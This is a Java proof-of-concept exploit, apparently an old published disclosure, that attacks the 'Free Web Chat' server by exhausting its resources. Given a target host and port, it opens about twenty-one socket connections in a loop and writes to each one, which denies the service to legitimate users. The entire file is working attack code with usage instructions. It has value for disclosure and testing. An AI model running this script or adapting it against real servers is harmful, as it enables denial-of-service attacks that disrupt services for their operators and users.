
/*
     Free Web Chat (Initial Release)- Resources Consumption - Proof Of Concept
     Coded by: Donato Ferrante
*/



import java.io.PrintStream;
import java.net.Socket;
import java.net.InetAddress;
import java.net.ConnectException;





public class FreeWebChat_ir_RC_poc {


final static String VERSION = "0.1";
final static int MAX_CONN = 20;



	
public static void main(String [] args){
	
	
   System.out.println(
                      "\n\nFree Web Chat - Resources Consumption - Proof Of Concept\n" +
                      "Version: " + VERSION + "\n\n"                 +
                      "coded by: Donato Ferrante\n"                  +
                      "e-mail:   fdonato@autistici.org\n"            +
                      "web:      www.autistici.org/fdonato\n\n"
                    );

   String host = "";
   int port = 0;

	if(args.length < 2){

		System.out.println("Usage: <host> <port>\n\n");
		System.exit(-1);

	}
	
	try{
		
		host = args[0];
		port = (new Integer(args[1])).intValue();
		
	}catch(Exception e){System.exit(-1);}
	
	
	try{

	   int i = 0;
	   while(i++ <= MAX_CONN){
			
			try{

        		InetAddress addr = InetAddress.getByName(host);
        		Socket socket = new Socket(addr, port);

        		PrintStream printStream = new PrintStream(socket.getOutputStream());
        		printStream.println("test");
        		printStream.close();
				
    
			}catch(ConnectException ce){System.out.println(ce); System.exit(-1);}
		}
			
	}catch(Exception e){System.out.println(e); System.exit(-1);}
	
	
	System.out.println("\nFree_Web_Chat - Resources Consumption - Proof_Of_Concept terminated.\n\n");
	
	}	
	
	
}


